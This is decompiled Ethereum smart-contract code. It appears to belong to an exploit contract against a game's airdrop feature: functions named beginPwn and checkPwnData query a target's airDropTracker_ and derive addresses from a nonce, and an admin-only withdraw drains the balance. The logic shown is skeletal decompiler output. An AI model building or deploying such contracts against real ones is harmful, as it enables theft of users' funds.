contract main {




// =====================  Runtime code  =====================


address stor0;
address adminAddress;
uint256 nonce;
uint256 stor9;

function nonce() {
    return nonce
}

function admin() {
    return adminAddress
}

function _fallback() payable {
    revert
}

function withdraw() {
    require msg.sender == adminAddress
    call adminAddress with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function beginPwn() payable {
    require msg.sender == adminAddress
    require ext_code.size(stor0)
    call stor0.airDropTracker_() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function checkPwnData() payable {
    require ext_code.size(stor0)
    call stor0.airDropTracker_() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    return 0, 0, address(sha3(0, 0, this.address, nonce))
}



}
